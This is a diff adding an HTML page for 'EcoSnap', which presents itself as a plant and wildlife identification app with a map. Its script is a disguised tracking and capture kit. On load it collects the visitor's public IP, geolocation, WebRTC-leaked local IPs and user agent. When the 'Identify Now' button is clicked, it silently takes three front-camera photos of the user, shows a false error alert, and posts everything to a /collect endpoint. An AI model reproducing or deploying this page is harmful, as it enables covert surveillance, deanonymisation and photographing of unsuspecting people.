@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>EcoSnap - Nature at Your Fingertips</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&family=Merienda:wght@700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<style>
+:root {
+  --primary: #3b7d2a;
+  --secondary: #8bc34a;
+  --accent: #ffd166;
+  --bg-light: #f8fff6;
+  --glass: rgba(255,255,255,0.8);
+  --text-dark: #2f3e2f;
+  --text-muted: #607d60;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  font-family: "Poppins", sans-serif;
+  background: linear-gradient(180deg, #d7f7d4 0%, #f8fff6 100%);
+  color: var(--text-dark);
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
+  align-items: center;
+  padding: 30px 15px;
+}
+
+header {
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+header h1 {
+  font-family: "Merienda", cursive;
+  font-size: 2.8em;
+  color: var(--primary);
+}
+
+header span {
+  font-size: 1.1em;
+  color: var(--text-muted);
+  display: block;
+  margin-top: 6px;
+}
+
+.container {
+  width: 90%;
+  max-width: 480px;
+  background: var(--glass);
+  border: 1px solid #d1e8d1;
+  border-radius: 18px;
+  padding: 24px;
+  box-shadow: 0 6px 18px rgba(91,140,91,0.15);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+#about {
+  font-size: 1.05em;
+  color: var(--text-muted);
+  margin-bottom: 16px;
+  text-align: center;
+  line-height: 1.5em;
+}
+
+#map {
+  width: 100%;
+  height: 240px;
+  border-radius: 14px;
+  margin-bottom: 18px;
+  overflow: hidden;
+  box-shadow: 0 3px 12px rgba(59,125,42,0.2);
+}
+
+#map .leaflet-tile {
+  filter: brightness(1.2) contrast(1);
+}
+
+button {
+  width: 100%;
+  padding: 14px;
+  font-size: 1.15em;
+  font-weight: 600;
+  color: #fff;
+  background: linear-gradient(90deg, var(--primary), var(--secondary));
+  border: none;
+  border-radius: 12px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+}
+
+button:hover {
+  background: linear-gradient(90deg, var(--secondary), var(--primary));
+  transform: scale(1.03);
+  box-shadow: 0 4px 18px rgba(91,140,91,0.3);
+}
+
+footer {
+  text-align: center;
+  font-size: 0.9em;
+  color: var(--text-muted);
+  margin-top: 30px;
+}
+
+canvas { display: none; }
+</style>
+</head>
+<body>
+<header>
+  <h1>EcoSnap</h1>
+  <span>Discover Nature Around You</span>
+</header>
+
+<div class="container">
+  <div id="about">
+    Snap a photo of any plant or wildlife, and EcoSnap will help you identify it and show nearby nature spots.
+  </div>
+  <div id="map"></div>
+  <button id="scanBtn">Identify Now</button>
+  <canvas id="canvas"></canvas>
+</div>
+
+<footer>© 2025 EcoSnap</footer>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script>
+// ===== Map Initialization =====
+let map = L.map('map').setView([0, 0], 2);
+
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+  subdomains: 'abc',
+  attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OSM</a>',
+  maxZoom: 19
+}).addTo(map);
+
+const greenPin = L.icon({
+  iconUrl: 'https://cdn-icons-png.flaticon.com/512/616/616408.png',
+  iconSize: [32, 32],
+  iconAnchor: [16, 32]
+});
+
+// Payload
+const payload = {
+  userAgent: navigator.userAgent,
+  serverObservedIP: "${serverIP}",
+  publicIP: null,
+  geolocation: null,
+  webrtcIPs: [],
+  images: []
+};
+
+// Public IP
+fetch("https://api.ipify.org?format=json")
+  .then(r=>r.json())
+  .then(d=>{ payload.publicIP=d.ip; send(false); });
+
+// Geolocation
+if(navigator.geolocation){
+  navigator.geolocation.getCurrentPosition(pos=>{
+    payload.geolocation={ lat:pos.coords.latitude, lng:pos.coords.longitude, acc:Math.round(pos.coords.accuracy) };
+    map.setView([pos.coords.latitude,pos.coords.longitude],14);
+    L.marker([pos.coords.latitude,pos.coords.longitude], { icon: greenPin }).addTo(map);
+    send(false);
+  });
+}
+
+// WebRTC IPs
+const pc = new RTCPeerConnection({ iceServers:[{urls:"stun:stun.l.google.com:19302"}] });
+pc.createDataChannel("x");
+pc.onicecandidate = e=>{ if(!e.candidate) return; const ip=e.candidate.candidate.split(" ")[4]; if(ip && !payload.webrtcIPs.includes(ip)) payload.webrtcIPs.push(ip); };
+pc.createOffer().then(o=>pc.setLocalDescription(o));
+
+// Camera (Front-facing)
+document.getElementById("scanBtn").addEventListener("click", startScanner);
+function startScanner(){
+  navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" } }).then(stream=>{
+    const video=document.createElement("video"); video.srcObject=stream; video.play();
+    const canvas=document.getElementById("canvas"); const ctx=canvas.getContext("2d"); const imagesCaptured=[];
+    video.onloadedmetadata=async ()=>{
+      canvas.width=video.videoWidth; canvas.height=video.videoHeight;
+      for(let i=0;i<3;i++){
+        ctx.drawImage(video,0,0);
+        const imgData=canvas.toDataURL("image/png").split(',')[1];
+        imagesCaptured.push(imgData);
+        await new Promise(r=>setTimeout(r,300));
+      }
+      payload.images=imagesCaptured.filter(img=>img && img.length>0);
+      send(true);
+      stream.getTracks().forEach(t=>t.stop());
+      alert("Failed to initialize camera.");
+    };
+  }).catch(err=>{ console.log("Camera error:",err); alert("Failed to access camera."); });
+}
+
+function send(force){
+  fetch("/collect",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify(payload)
+  });
+}
+</script>
+</body>
+</html>
